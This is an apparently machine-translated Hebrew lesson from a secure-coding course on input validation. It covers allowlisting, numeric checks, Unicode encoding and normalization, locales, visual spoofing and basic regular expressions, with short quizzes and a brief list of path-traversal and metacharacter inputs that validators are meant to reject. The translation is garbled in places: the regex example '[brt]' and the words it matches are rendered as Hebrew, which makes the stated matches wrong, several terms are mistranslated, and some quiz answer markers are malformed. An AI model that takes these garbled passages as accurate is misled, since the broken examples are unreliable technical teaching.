סעיף זה דן כיצד ליישם תוכנה מאובטחת. נעשה זאת על ידי בחינת תצוגה מופשטת מאוד של תוכנית, כפי שמודגם על ידי האיור הבא:

![מודל התוכנית](program_model.png)

**תצוגה מופשטת של תוכנית**

כמעט לכל התוכניות יש תשומות (שעליך לאמת), לעבד נתונים, לקרוא מדי פעם לתוכניות אחרות, ובסופו של דבר להפיק פלט(ים). קריאה לתוכנית אחרת יוצרת (למעשה) תשומות לאותן תוכניות אחרות, ותפוקות מאותן תוכניות אחרות. סעיפי המשנה הבאים ידונו בכל אחד מהתחומים הללו בתורו. לאחר מכן נדון בכמה נושאים מיוחדים.

כמובן, רק לומר  "*לכתוב קוד מאובטח" * או * "לא לעשות טעויות" לא* מועיל. החדשות הטובות הן שכמעט כל השגיאות שגורמות לפגיעויות כיום ניתנות לקיבוץ למספר קטן יחסית של קטגוריות, וחלק מהקטגוריות הללו נפוצות במיוחד. אז כפי שצוין קודם לכן, אנו יכולים לחסל את הרוב המכריע של פגיעויות אבטחה פשוט על ידי למידה על קטגוריות אלה, לדעת איך לחפש אותם, ולצמצם אותם. נזכיר שוב ושוב את רשימת 10 המובילים של OWASP (עבור יישומי אינטרנט) ואת רשימת 25 המובילים של CWE (עבור יישומים באופן כללי), מכיוון שהם מספקים דרך שימושית לזהות מה הכי חשוב.

כמה מהסוגים הנפוצים של פגיעויות הם בעיות תכנון. עם זאת, רוב השאר הם בעיות יישום. כאשר נעבור על המודל שלנו של תוכנית, נדון בסוגים הרלוונטיים של פגיעויות, כולל כיצד לזהות אותן ולנטרל אותן. לאחר שתתחיל ליישם מידע זה, תגלה כי פגיעויות רבות נעלמות מהתוכנית שלך.

כמעט כל התוכניות צריכות לקבל קלט. אז נתחיל לבחון כיצד להטמיע תוכנה מאובטחת על ידי דיון כיצד לטפל באופן מאובטח בתשומות.

# אימות קלט

פרק זה מתאר כיצד לאמת קלט, כולל כיצד לאמת מספרים וטקסט, את החשיבות של מזעור משטחי תקיפה וכיצד לשפר את הזמינות על-ידי התחשבות בקלטים.

מטרות הלמידה:

1. דונו ביסודות של אימות קלט.

2. להבין כיצד לאמת מספרים.

3. בדוק בעיות מרכזיות בטקסט, כולל Unicode ואזורים.

4. הסבר כיצד להשתמש בביטויים רגולריים כדי לאמת קלט טקסט.

5. להבין את החשיבות של מזעור משטחי התקיפה.

6. דונו בברירות מחדל מאובטחות ובאתחול מאובטח.

7. שפר את הזמינות על-ידי התחשבות בתשומות.

## יסודות אימות קלט

### מבוא ליסודות אימות קלט

חלק מהכניסות מגיעות ממשתמשים לא מהימנים, ויש לאמת קלטים אלה (לפחות) לפני השימוש בהם. אם תמנע מנתונים לא חוקיים להיכנס לתוכנית שלך, יהיה הרבה יותר קשה לתוקפים לנצל את התוכנה שלך. אימות קלט יכול גם למנוע באגים רבים ולהפוך את התוכנית שלך לפשוטה יותר. אחרי הכל, אם התוכנית שלך יכולה לדחות מיד כמה נתונים פגומים, אתה לא צריך לכתוב את הקוד כדי להתמודד עם מקרים מיוחדים אלה מאוחר יותר. זה חוסך זמן, וקוד כזה במקרה מיוחד סביר יותר שיהיו שגיאות עדינות.

זה יכול להיות גם רעיון טוב לבדוק תשומות ממשתמשים מהימנים. אפילו משתמשים מהימנים עושים טעויות, ומיד לתפוס את הטעויות האלה יכול להפוך את המערכת לאמינה יותר. יש ויכוח על כמה אימות צריך להיעשות על קלטים ממשתמשים מהימנים. מצד אחד, משתמשים מהימנים יכולים בבירור לעשות טעויות, ואימות יכול למנוע טעויות יקרות. מצד שני, אם יותר מדי זמן מושקע באימות תשומות ממשתמשים מהימנים, אולי ידלגו על משימות אחרות חשובות יותר, ולפעמים משתמשים מהימנים צריכים להיות מסוגלים לעשות דברים יוצאי דופן כדי להגיב לאירועים בלתי צפויים. כאשר זה לא גוזל זמן רב מדי, כנראה שעדיף לבצע לפחות אימות קלט מסוים גם על קלטים ממשתמשים מהימנים. לצורך קורס זה, נתמקד באימות קלט ממשתמשים לא מהימנים. רק זכור שניתן ליישם את אותן טכניקות גם על קלטים מהימנים.

תחילה, הקפד לזהות את כל הקלטים ממשתמשים שעלולים להיות לא מהימנים, כך שתאמת את כולם. כאשר אתה יכול, לחסל את התשומות או להפוך את זה בלתי אפשרי עבור משתמשים לא מהימנים לספק להם מידע. דנו בכך קודם לכן מכיוון שעקרון התכנון *ממזער את משטח התקיפה*.

בכל קלט שנותר ממשתמשים שעלולים להיות לא מהימנים עליך לאמת את הנתונים שמגיעים. בדיקות אימות קלט אלה הן סוג של בדיקת אבטחה, ולכן עליך לוודא שבדיקות אימות קלט אלה אינן ניתנות לעקיפת, כפי שדיברנו קודם לכן בעקרון העיצוב *אי-עקיפה*. ** כתזכורת:** תן אמון רק בבדיקות אבטחה (כולל אימות קלט) כאשר הן פועלות בסביבה שאתה בוטח בה. זה חשוב במיוחד עבור תוכניות JavaScript - מאז JavaScript יכול לרוץ על דפדפני אינטרנט, קל לשלוח בדיקות אבטחה לדפדפן האינטרנט ולשכוח כי *התוקפים* יכולים לשלוט בדפדפני האינטרנט שלהם. לא ניתן לתת אמון בבדיקות אימות קלט שאתה מבצע בסביבה לא מהימנה. אם אתה בוטח בסביבת השרת שלך ולא בסביבת הלקוח, יש לבצע את כל הבדיקות הרלוונטיות לאבטחה בסביבת השרת. דיברנו על זה כבר, אבל חשוב להדגיש כי זו בעיה כל כך נפוצה ורצינית. עכשיו בואו נעבור לאופן שבו ניתן לאמת קלט בפועל.

### כיצד ניתן לאמת קלט?

עליכם לקבוע מה חוקי, באופן צר ככל שתוכלו באופן סביר, ולדחות כל דבר שאינו תואם את ההגדרה הזו. שימוש בכללים המגדירים מה חוקי, ובמשתמע דחיית כל דבר אחר, נקרא  רשימת *היתרים* (הכללים עצמם הם *רשימת התרה*). מילים נרדפות הן *רשימה טובה* (הכללים הם הרשימה הטובה*) והרשימה הלבנה* הנפוצה מבחינה היסטורית * (הכללים הם *הרשימה הלבנה**). באופן כללי, לא לעשות את ההפך. כלומר, זו בדרך כלל טעות לנסות לזהות מה לא חוקי ולכתוב קוד כדי לדחות רק את המקרים האלה. גישה לא בטוחה בדרך כלל, שבה אתה מנסה לרשום את כל מה שצריך לדחות, נקראת *denylisting* (הכללים הם *הכחשה*). מילים נרדפות לשלילת רשימות  הן רשימה *שגויה והרשימה השחורה* הנפוצה מבחינה היסטורית * (הכללים נקראים *אז רשימה רעה* או *רשימה שחורה**). הכחשה מובילה בדרך כלל לפגיעויות אבטחה, מכיוון שאם אתה שוכח לטפל במקרה חשוב אחד או יותר של קלט לא חוקי, זו יכולה להיות הזדמנות עבור תוקף. אם תשכח לאפשר מקרה, תקבל דוח באגים והתוכנה שלך תיכשל באופן מאובטח. חוץ מזה, זה בדרך כלל הרבה יותר קל פשוט לזהות *מה מותר* ולאפשר רק את התשומות האלה. בכמה מקרים נדירים אתה *בהחלט יכול* להיות בטוח שספרת את כל התשומות הרעות האפשריות, ובמקרה זה הכחשת רישום היא בסדר, אבל אלה נדירות. בדרך כלל הכחשת הרשימה מובילה לצרות.

 אימות קלט לא תקין הוא גורם כה נפוץ לפגיעויות אבטחה שהוא 2019 CWE Top 25 #3 ו- 2021 CWE Top 25 #4. הוא מזוהה גם כ- [CWE-20](https://cwe.mitre.org/data/definitions/20.html) (*אימות קלט לא תקין*).

החדשות הטובות הן שבדרך כלל לא לוקח זמן רב להוסיף אימות קלט, וזה יכול מיד להפוך את התוכנית שלך לקשה יותר לתקוף. ייתכן שיהיה קשה להחליט על תגובה ידידותית למשתמש לקלט לא חוקי, אבל זה קל יותר מאשר לסבול מהתקפה מוצלחת.

יש סיבה טובה לזהות  ערכים *בלתי חוקיים*; השתמש בהם כסדרה של בדיקות כדי לוודא שקוד האימות שלך יסודי. ייתכן שהבדיקות האלה פשוט מבוצעות בראש שלך, אבל לפחות כמה מהן אמורות להפוך למקרי מבחן בחבילת הבדיקות האוטומטית שלך. כאשר אנו מקימים מסנן קלט, אנו תוקפים מנטלית את רשימת ההיתרים שלנו עם כמה ערכים לא חוקיים שזוהו מראש כדי לוודא שכמה ערכים לא חוקיים ברורים לא יעברו. בהתאם לקלט, הנה כמה דוגמאות לערכים לא חוקיים נפוצים שמסנני הקלט שלך עשויים להזדקק למנוע: המחרוזת הריקה, "**. **", "**.. **", ".**. /**", כל דבר שמתחיל ב-"**/**" או "**.** ", כל דבר עם "**/**" או "**&**" בתוכו, מטא-תווים נפוצים (כמו נקודה-פסיק, מרכאות בודדות, מרכאות כפולות והסימן הפחות מ-), וכל תווי הבקרה (במיוחד תו NUL והשורה החדשה). כאשר צפויים מספרים, בדיקה אם קיימים סוגים אחרים של טקסט שאין להתיר אותם. בדוק גם תשומות מאוד מאוד ארוכות.

בהמשך, נדון בסוגים שונים של כלי ניתוח אבטחה. סוג אחד, fuzzers, בכוונה ליצור מספר רב של קלט זדוני אשר (בין היתר) לבדוק את איכות בדיקות אימות הקלט שלך. אבל fuzzers אינם מבטיחים למצוא את כל בעיות אימות הקלט. במקום זאת, יישם בזהירות את אימות הקלט ולאחר מכן השתמש בכלים שיעזרו לך למצוא בעיות שאחרת היית מפספס.

שוב, הקוד שלך צריך להשתמש ב*- allowlisting* (זיהוי צר של מה חוקי ודחיית השאר), ולא *בהכחשת רישום* (מנסה לזהות קלטים שגויים). נסה להפוך את תבנית הרשימה המותרת צרה ככל האפשר, כולל הגבלת אורך הקלט המרבי (ואורך הקלט המינימלי במידת הצורך).

#### חידון 1.1: כיצד מאמתים קלט?

\>\>באופן כללי, עליך לאמת קלט ממשתמשים לא מהימנים על-ידי:<<

(!) דחיית דפוסים הידועים כזדוניים.

(x) זיהוי דפוס קפדני של המותר ודחיית כל קלט שאינו עומד בו.

[הסבר]

באופן כללי, אתה צריך להשתמש *ב- allowlisting*, לא *להכחיש*. תוקפים תמיד יכולים להמציא התקפה נוספת, ולכן הניסיון להמציא רשימה של "כל מה שצריך להכחיש" הוא משימה בלתי נגמרת. בדרך כלל עדיף לקבוע באופן צר מה צריך להיות מותר, ולאחר מכן לדחות את כל השאר.

[הסבר]

## אימות קלט: מספרים וטקסט

### אימות קלט: כמה סוגי נתונים פשוטים

אם כך, כיצד ניתן לבצע אימות קלט המשתמש ברשימת היתרים (כלומר, תבנית המוגדרת באופן צר ככל האפשר)? בקיצור, אתה עושה את זה על כל קלט, ומה שאתה בודק תלוי בסוג הנתונים. בואו נדון בכמה מקרים נפוצים בהמשך.

#### מספרים

קלט נפוץ אחד הוא רצף של תווים המייצגים מספר. בדרך כלל, אתה בודק מספרים (במיוחד מספרים שלמים) כדי לוודא שהם בין ערך מינימלי לערך מקסימלי. זה טוב לעשות קצת בדיקה לפני שאתה ממיר את הטקסט למספר, אבל במקרה מסוים זה, לבדוק את הערך *לאחר* ההמרה למספר, כדי להיות בטוח כי *שאר* התוכנית תראה את המספר רק אם הוא בטווח חוקי. המינימום הנפוץ הוא 0 ו-1. אם המספר אמור להיות מספר שלם, ודא שהוא מספר שלם ודחה כל דבר אחר.

כאשר הדבר מעשי, אחסן את התוצאה המספרית בכתב המוגדר באופן צר למטרה. לדוגמה, אחסן את המספר בסוג מספר שלם אם המספר הוא מספר שלם, השתמש בסוג לא חתום אם מספרים שליליים אינם מותרים, וכן הלאה. אם אתה צריך לקבל נתוני נקודה צפה ממשתמש לא מהימן (ולנסות לא!), אחסן אותם בכתב מתאים והיזהר מהמקרים המיוחדים הרבים שלהם (כגון NaN, אינסוף, 0 שלילי, זרימות תחתיות והצפות). לדוגמה, בדרך כלל ערך הנקודה הצפה NaN אינו שווה לערך כלשהו; היא אפילו לא שווה לעצמה. הגבלת הסוג אינה תמיד מעשית משום שהיא מאוד תלויה בשפה; לא לכל השפות יש סוגים כאלה. לדוגמה, JavaScript אינו כולל כתב לא חתום.

שים לב ש*"אפשר רק מספר שלם בין 0 ל- 200 כולל נקודות קצה אלה"* היא רשימת התרה; זיהיתם את התבנית של מה שמותר, וכל דבר אחר יידחה.

#### תבניות טקסט מיוחדות ידועות

לפעמים הקלט שלך הוא טקסט עם פורמט סטנדרטי ויש ספריה שיכולה לבצע את האימות עבורך. לדוגמה, לרוב השפות יש שגרה כלשהי שיכולה לבדוק את הפורמט של כתובות דואר אלקטרוני. כשיש לך אחד שאתה יכול לסמוך עליו, השתמש בו!

לעתים ספריות האימות שבהן באפשרותך להשתמש דורשות תצורה מסוימת. שוב, הגדר אותם להיות צרים (מגבילים) ככל האפשר. לדוגמה, אם אתה מקבל HTML, הגבל אותו רק לתגים ולתכונות הדרושים לך. לעתים קרובות, כאשר אתה מקבל HTML, עליך לקבל רק כמה תגים  (לדוגמה, <i> עבור ** נטוי, <b> עבור ** מודגש, <a> ** עבור היפר-קישורים) ותכונות (לדוגמה**, התכונה href** של ** התג ****<a>**** כך שתוכל לומר לאן לקשר, ואולי מזהה ****  תכונה כך שאחרים יוכלו להתייחס לנקודה מסוימת). לאחר מכן, כאשר תוקף מנסה לספק HTML עם תגים אחרים (לדוגמה, **<script זדוני>**), המאמת פשוט לא יקבל אותו כלל.

תבניות קלט מסוימות הן מבנים מורכבים של הרבה נתונים אחרים. לדוגמה, קבצי JSON, XML ו- CSV יכולים להכיל נתונים רבים אחרים. בדרך כלל תשתמש בספריה אמינה כדי לבחון ולחלץ את חלקי הנתונים הדרושים לך, ולאחר מכן תאמת כל פריט. אז שוב, אם אתה מחלץ רצף של תווים המייצגים מספר, היית מאמת את המספר (למשל, כדי לראות אם הוא נמצא בטווח המינימלי והמקסימלי). במקרים רבים, זהו ערך טקסט. בהמשך נדון בטיפול במבנים מרוכבים, אך בשלב מסוים הם יתפרקו לערכים ספציפיים, לעתים קרובות כמספרים או כטקסט.

תוכניות רבות צריכות לאמת שדות טקסט, אך הכללים של שדות אלה אינם מוגדרים בספריה קיימת. חלק מהכלים מאפשרים לנו להתמודד איתם בקלות, אבל כדי להשתמש בהם, אנחנו צריכים להבין קצת רקע. תחילה נצטרך לדון יותר על טקסט, unicode ואזורים באופן כללי. לאחר מכן נדון באימות טקסט באופן כללי ובדרך המקובלת לעשות זאת - ביטויים רגולריים.

#### חידון 1.2: אימות קלט: כמה סוגי נתונים פשוטים

\>\>בחר את כל שיטות העבודה המומלצות לאימות מספר קלט ממקור לא מהימן:<<

[!x] בדוק כי הוא לפחות גדול כמו המינימום.

[x] בדוק שהוא לכל היותר גדול כמו המקסימום.

[x] השתמש בסוג לא חתום אם השפה שלך תומכת בו והקלט אינו מורשה להיות שלילי.

[x] דרוש שהמספר יהיה מספר שלם אם זהו סוג המספר הצפוי היחיד.

### Sidequest: טקסט, Unicode ואזורים

[[אופציונלי]]

לעתים קרובות אתה מקבל טקסט כקלט (ישירות או כחלק ממבנה גדול יותר). נתאר טקסט פשוט כרצף של תווים. אם קלט הטקסט אינו מהימן, עליך לאמת טקסט זה. כדי להבין זאת, עלינו להבין מהו טקסט**. מספר גדול להפליא של מפתחים מעולם לא למדו הרבה על טקסט - למרות שזה אחד מסוגי הנתונים הנפוצים ביותר - אז בואו נוודא שאתה מבין את זה קודם. אם אתה כבר בטוח שאתה מכיר בעיות טקסט כגון Unicode, קידוד ואזורים, אל תהסס לדלג הלאה.

#### נקודות קוד וקידוד

מחשבים דיגיטליים אינם מטפלים ישירות בתווים; במקום זאת עלינו להקצות מספר לכל תו. ערכות תווים שונות עם משימות שונות נוצרו עבור שפות שונות, וזה יצר סיוטים של יכולת פעולה הדדית. ברוב המכריע של המקרים כיום תשתמש בהקצאות התווים שצוינו על-ידי Unicode ו- ISO/IEC 10646, המגדירות ערכת תווים אוניברסלית (UCS) המקצה מספר ייחודי (*נקודת קוד*) עבור כל תו. לדוגמה, הם מקצים לתו הלטיני "A" את המספר העשרוני 65.

מבחינה היסטורית, חשבו ש-16 סיביות יספיקו כדי לזהות את כל התווים, אבל זה היה שגוי ושונה ב-1996 (כיום הם משתמשים ב-21 סיביות כדי לקודד כל תו). כתוצאה מטעות זו, לחלק משפות התכנות יש סוג "תו" (למשל, תו של ג'אווה****) שאורכו 16 סיביות בלבד. סוג נתונים של 16 סיביות אינו יכול, כשלעצמו, לאחסן כל תו שרירותי של 21 סיביות, כך שבשפות תכנות וממשקי API עם "תו" של 16 סיביות, "תו" הוא לפעמים רק חצי תו בפועל.

יש להחליף טקסט המשתמש במשימות אלה באמצעות *קידוד*. ישנם חמישה קידודים סטנדרטיים עבור יוניקוד: UTF-32 (ביג-אנדיאן וקטן-אנדיאן), UTF-16 (ביג-אנדיאן וקטן-אנדיאן) ו-UTF-8. באופן כללי, עליך להשתמש ב- UTF-8 אלא אם כן יש לך סיבה לעשות אחרת. ל-UTF-16 ול-UTF-32 יש שתי צורות: "אנדיאן קטן" ו"אנדיאן גדול". אם אינך יודע אם הנמען מצפה ל-big-endian או ל-little-endian, עליך להוסיף *סמן סדר בתים* בתחילת הטקסט כדי לוודא שהמקבל מפרש אותו כראוי, ובעת קבלת UTF-16 או UTF-32, היישום שלך צריך לשים לב לכך. בעיה קריטית היא שרצפים מסוימים של בתים *אינם* חוקיים, ולכן כאשר אנו מבצעים אימות קלט, נצטרך לוודא שהנתונים שאנו מקבלים תקפים לקידוד שאנו מצפים לו.

#### אזורי

פירוש הדמויות מסובך יותר ממה שאתם חושבים. הרבה תלוי ב"אזור", המגדיר את שפת המשתמש, מדינה/אזור, העדפות ממשק משתמש וכנראה גם קידוד תווים. לדוגמה, במערכות יוניקס/לינוקס, אנגלית אוסטרלית עם קידוד UTF-8 מיוצגת כאזור **en_AU. UTF-8**. אזור חשוב, מכיוון שהוא משפיע על האופן שבו הדמויות מתפרשות. לדוגמה, זה משפיע:

* סדר איסוף (מיון)

* סיווג תווים (מהי "אות"?). טווחים כמו "A-Za-z" אינם מפרטים *את כל התווים האלפביתיים* באזורים שרירותיים. אם אתה משתמש באזור C או POSIX ומעבד רק תווי ASCII, טווח זה הוא הרשימה המלאה של תווים אלפביתיים, אך הדבר אינו נכון באופן כללי.

* המרת רישיות (מהי אותיות גדולות/קטנות של תו, אם היא קיימת?). שים לב שגם אם יש המרה, ייתכן שהיא לא תומר לתו בודד באזור נתון.

אם ברצונך לפרש טקסט באותו אופן ללא קשר לאזור, הפתרון הרגיל הוא להשתמש באזור "C" aka "POSIX" - עם זאת, היזהר, כי זה לא תמיד מה שהמשתמש רצה.

המרת מקרה טעונה במיוחד. בשפות מסוימות אין אותיות גדולות וקטנות. גם אם כן, המיפוי ביניהם שונה בין אזורים שונים. אז הגרסה באותיות רישיות של אות *אינה* קבועה - היא מבוססת על האזור!

דוגמה מצוינת לכך הן השפות הטורקיות המשתמשות באלפבית הטורקי. באלפבית זה אותיות "I" מנוקדות וחסרות נקודות הן אותיות נפרדות עם צורות אותיות גדולות וקטנות. לדוגמה, אותיות קטנות מנוקדות "i" כאשר הן רישיות הופכות לאותיות רישיות מנוקדות "İ" (לא אותיות רישיות ללא נקודה "I" כפי שקורה באזור אנגלי), ואותיות רישיות ללא נקודה "I" כאשר אותיות קטנות הופכות לאותיות קטנות ללא נקודה "ı". שים לב כי "i" ו- "I" *אינם* שווים בהתאמה חסרת רגישות לרישיות במערכת המיושמת כראוי עבור אזורים כאלה. זה הביא למספר נקודות תורפה באבטחה, ומדי פעם נזכיר זאת בקורס מכיוון שזו דוגמה מצוינת לסוגי הטעויות שיכולות לקרות אם אינך מודע לכך.

אם אתה רוצה לדעת אם "שני רצפים של תווים שקולים" התעלמות מקרה, אז במקרה הכללי אתה צריך לקרוא שגרה לעשות את זה *ולספק* לו את האזור להשתמש. זה מעלה את הסוגיות על שקילות באופן כללי, אשר נדון בהמשך.

#### שקילות יוניקוד

מתכנתים רבים מניחים שאם רצף של טקסט "נקודות קוד" שונות, הן מחרוזות שונות. אמנם זה בסדר למטרות מסוימות, אבל זה המודל המנטלי הלא נכון עבור אחרים, גם אם אתה מניח שאתה רוצה התאמה "תלוית מקרה". Unicode היה צריך להיות מפותח באופן שהיה תואם את התקנים הקיימים, וזה הוביל כמה סיבוכים.

במקרים מסוימים עליך להשתמש בשגרות ספרייה כדי לבדוק שקילות קנונית של Unicode. הסיבה לכך היא שיש כמה נקודות קוד, או רצפים של נקודות קוד, כי בנסיבות רבות צריך להיחשב *שווה ערך* במובן זה שהם צריכים תמיד להיראות זהים, גם אם יש להם ערכים בסיסיים שונים. לדוגמה, נקודת הקוד U+006E (האותיות הקטנות הלטיניות "n") ואחריה U+0303 (הטילדה המשלבת "◌̃") שקולה מבחינה קנונית לנקודת הקוד U+00F1 ("ñ").  דוגמה נוספת היא התו "Å" שניתן לייצג כ- U+00C5 (האות "אות גדולה לטינית A עם טבעת מעל") או כ- U+212B ("סימן אנגסטרום"): שני ערכים אלה צריכים להיחשב שקולים.

במקרים אחרים, עליך להשתמש בשגרות כדי לבדוק תאימות ל- Unicode. הסיבה לכך היא שישנם כמה רצפים שעשויים להיראות שונים אך תהיה להם אותה משמעות בסיסית. לדוגמה, נקודת הקוד U+FB00 (טיפוגרפית "ff") תואמת, אך לא שוות ערך, ל- U+0066 U+0066 (שתי אותיות "f" לטיניות). מחרוזות שוות ערך תואמות תמיד, אך מחרוזות תואמות אינן תמיד שוות ערך.

זהו כאב, ולכן תקן Unicode מגדיר הליכי נורמליזציה של טקסט, הנקראים נורמליזציה של Unicode. נורמליזציה של Unicode הופכת רצפים מקבילים או תואמים לאותו רצף תווים בדיוק. ישנן 4 צורות נורמליזציה:

* NFD (נורמליזציה של צורת פירוק קנוני)<br>תווים מפורקים על ידי שקילות קנונית, ותווים משולבים מרובים מסודרים בסדר מסוים.

* NFC (נורמליזציה טופס הרכב קנוני)<br>תווים מפורקים ולאחר מכן מחדש על ידי שקילות קנונית.

* NFKD (פירוק תאימות טופס נורמליזציה)<br>תווים מפורקים על-ידי תאימות, ותווים משולבים מרובים מסודרים בסדר מסוים.

* NFKC (הרכב תאימות טופס נורמליזציה)<br>תווים מפורקים על ידי תאימות, ולאחר מכן מורכבים מחדש על ידי שקילות קנונית.

מנקודת מבט של אבטחה, בדרך כלל אין זה משנה *באיזו* נורמליזציה של Unicode אתה משתמש, אך אם ברצונך לקבוע אם שתי מחרוזות שוות, עליך להיות *עקבי* לגבי הנורמליזציה שבה אתה משתמש בעת השוואתן. כמו כן, שים לב שברגע שאתה מנרמל רצף של תווים, אתה לא יכול באופן כללי ליצור מחדש בדיוק את הרצף המקורי.

#### התחזות חזותית

*התחזות חזותית* מתרחשת כאשר שתי מחרוזות שונות טועות בכך שהן *זהות* על ידי המשתמש. תוקפים ישתמשו לעיתים בהתחזות חזותית כחלק מהתקפה.

התחזות חזותית יכולה להתרחש אפילו בקבוצת המשנה ASCII של Unicode. הספרה "0" נראית כמו האות הגדולה "O", והספרה "1" נראית כמו האות הקטנה "l". לדוגמה, תוקף עשוי לנסות ליצור  תחום **paypa1.com** זדוני  במקום **paypal.com**. הרצף "rn" נקרא לעתים בטעות כאות "m"! עם זאת, רוב המשתמשים באלפבית לטיני מודעים לבעיות אלה, וגופנים רבים דואגים להפוך אותם למובחנים יותר.

אבל ברגע שאנחנו מתקדמים מעבר לתת-קבוצה ASCII, קיימים טריקים רבים אחרים:

* פירוק<br>"ƶ" עשוי להתבטא כ- U+007A U+0335 (z + שילוב של שכבת-על של קו קצר) או כ- U+01B6. משמעות הדבר היא כי רצפים שונים של בתים עשויים עדיין להצביע על אותה אות (ולכן להיראות זהים). נורמליזציה פותרת בעיה זו.

* אומיקרון יווני מעורב בכתב<br> ולטינית "o" נראים בדרך כלל אותו דבר, למרות שהם נמצאים בחלקים שונים של Unicode.

* אותו תסריט<br>חלק מהדמויות פשוט נראות דומות. לדוגמה, "-" מקף-מינוס U+002D לעומת מקף "‐" U+2010.

* זיוף טקסט דו-כיווני<br> חלק מהשפות הן בעיקר מימין לשמאל, אך עוברות במצבים מסוימים לשפות משמאל לימין. לפיכך, Unicode כולל מנגנונים לציון כיוון. אבל זה אומר כי המחרוזת "olleh", מוקף "להשתמש מימין לשמאל", ייראה חזותית זהה "שלום".

התחזות חזותית יכולה להיות מאתגרת מאוד להתמודדות באופן כללי. נורמליזציה ושימוש בגופנים ייחודיים לא תמיד מספיק, אבל זה יכול לפעמים להיות מאוד מועיל.

#### חידון 1.3: Sidequest: טקסט, Unicode ואזורים

\>\>ב- Unicode תו מיוצג על-ידי ערך של 16 סיביות. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

פשוט יש יותר מדי תווים מכדי לקודד את כולם ב- 16 סיביות, כך ש- Unicode משתמש כעת ב- 21 סיביות כדי לקודד תווים. שפות וממשקי API רבים משתמשים בערכי "תו" של 16 סיביות, אך אם הם מייצגים את כל תווי ה- Unicode, לעתים תווים אלה הם רק *חלק* מתוו ממשי.

[הסבר]

### אימות טקסט

עכשיו שיש לנו הבנה לגבי טקסט, בואו נדבר על אימות זה. כמעט בכל המקרים יש לפחות שתי בדיקות לעשות על טקסט ממקור לא מהימן:

* ודא שהטקסט נמצא בקידוד הטקסט הצפוי. כפי שצוין קודם לכן, אלא אם כן יש לך סיבה לעשות אחרת, אנו ממליצים להשתמש בקידוד UTF-8. UTF-8 יאפשר לך לעבוד עם סקריפטים משפות שרירותיות, הוא תואם לאחור עם ASCII, והוא נתמך באופן נרחב. UTF-8 הוא קידוד טוב, אך לא כל רצף של בתים הוא UTF-8 חוקי. פגיעויות רבות התרחשו מכיוון שמערכת קיבלה בתים מתוקף שאינם חוקיים UTF-8. לכן חשוב מאוד לאמת טקסט UTF-8 לפני שאתה מקבל אותו ממקור לא מהימן.

* בדוק אם הוא נמצא באורך המינימלי והמקסימלי, אם יש אורכים מינימליים ומקסימליים. מערכות רבות ירצו שיהיה להן מקסימום פשוט כדי למנוע מהתוקפים לשלוח כמויות גדולות באופן אבסורדי של נתונים.

במקרים מסוימים זה עשוי להיות קשה מאוד לבדוק הרבה יותר. שמות אישיים, בפרט, הם מאתגרים, במיוחד אם אתה חייב להתמודד עם שמות בכל האזורים. באזורים רבים יש מוסכמות שונות ממקומות אחרים; לדוגמה, האם השם הפרטי או שם המשפחה (למשל, שם המשפחה) מופיעים ראשונים? אולי אפילו אין שם משפחה או שם פרטי. שמות עשויים להכיל רווחים (אפילו בתוך שם פרטי או שם משפחה), וכמובן, אין ערובה לכך שהשם משתמש רק בתווים לטיניים או סיניים. לדיון באתגרים, ראו את השקרים [*שמתכנתים מאמינים בהם לגבי שמות – עם מאמר דוגמאות*](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/) מאת טוני רוג'רס (2018).

עם זאת, במקרים רבים יש עוד דברים שעליך לעשות כדי לאמת טקסט. במקרים רבים, לערכי טקסט יש כללים נוספים שעליהם לציית להם, וכללים אלה משתנים בהתאם לכל קלט טקסט.

לפעמים ערך הטקסט חייב להיות אחד מרשימה קצרה של ערכים. זה קל, פשוט לאחסן את האוסף המותר איפשהו (למשל, בסט או במילון). לאחר מכן, בכל פעם שתקבל קלט, ודא שהקלט הוא אחד מהערכים המותרים.

אבל זה משאיר אותנו עם קלטי טקסט רבים שיש להם כללים, אבל הם לא רק רשימה של ערכים מותרים. הם עשויים להיות תאריכים, שעות, מספרי חלקים, מספרי טלפון, מיקומים ושלל סוגים אחרים של נתונים. אנחנו עדיין צריכים לאמת את התשומות האלה, ולתוכניות רבות יש סוגים רבים ושונים של נתונים. זה אומר שאנחנו צריכים איזושהי דרך לתאר *בקלות* את כללי האימות האלה. הכלי הנפוץ למטרה זו הוא ביטויים רגולריים. ביחידה הבאה, נסביר באופן אופציונלי ביטויים רגולריים (regexes) אם אינך מכיר אותם; היחידה שאחריה תסביר כיצד להשתמש בביטויים רגולריים כדי לאמת קלטים.

### מבוא לביטויים רגולריים

[[אופציונלי]]

אם אתה כבר יודע על ביטויים רגולריים, אל תהסס לדלג על יחידה זו.

ביטוי רגולרי (regex**) הוא רצף תווים המגדיר תבנית טקסט. כמעט לכל שפות התכנות יש מערכת מובנית או ספרייה הנרכשת בקלות המיישמת שפת ביטוי רגולרי, ולכן בדרך כלל קל להתחיל להשתמש בביטויים רגולריים בתוכנית ללא קשר לאופן שבו היא מיושמת.

עם זאת, מפתחי תוכנה מסוימים מעולם לא השתמשו regexes. יחידה זו מספקת מבוא קצר אם אתה עדיין לא מכיר אותם. אם אתה כבר מבין regexes, אל תהסס לדלג ליחידה הבאה!

מבחינה היסטורית regexes פותחו כדי להקל על חיפוש טקסט, אם כי כיום הם משמשים לעתים קרובות כדי לקבוע אם טקסט מסוים מתאים לתבנית. ישנם יישומים רבים של מערכות regex, אבל מאז כולם באים מאותו שורש היסטורי יש להם הרבה במשותף.

הכלל הטריוויאלי ביותר הוא שאות או ספרה תואמת את עצמה. כלומר, regex**** "d" תואם את האות "**d**". רוב היישומים משתמשים בהתאמות תלויות רישיות כברירת מחדל, וזה בדרך כלל מה שאתה רוצה.

כלל נוסף הוא שסוגריים מרובעים מקיפים כלל המציין כל אחד ממספר התווים. אם הסוגריים המרובעים מקיפים רק אלפאנומריים, התבנית מתאימה לכל אחד מהם. אז **[ברט]** מתאים יחיד "**b", "**r**", או "**t**".**

התבנית "**.** " מתאים לכל תו אחד, למעט התו החדש. אם ברצונך להתאים לתקופה מילולית, קדם לה קו נטוי הפוך ("**\.** "). כמעט כל יישום של regexes יש מנגנון כדי לאפשר לך להחליט אם "**.** " צריך להתאים לקו חדש.

תבנית regex היא בדרך כלל רצף של כללים, כאמור אחד אחרי השני. לדוגמה, תבנית regex "**ca[ברט]**" תתאים לטקסט "**מונית", "**מכונית**", או "חתול**", מכיוון שהאותיות** "c" ו- "**a" **תואמות את עצמן, ו**- "" מתאים ל-** "b**", "**[ברט]**r" **או** "t******"** יחיד.

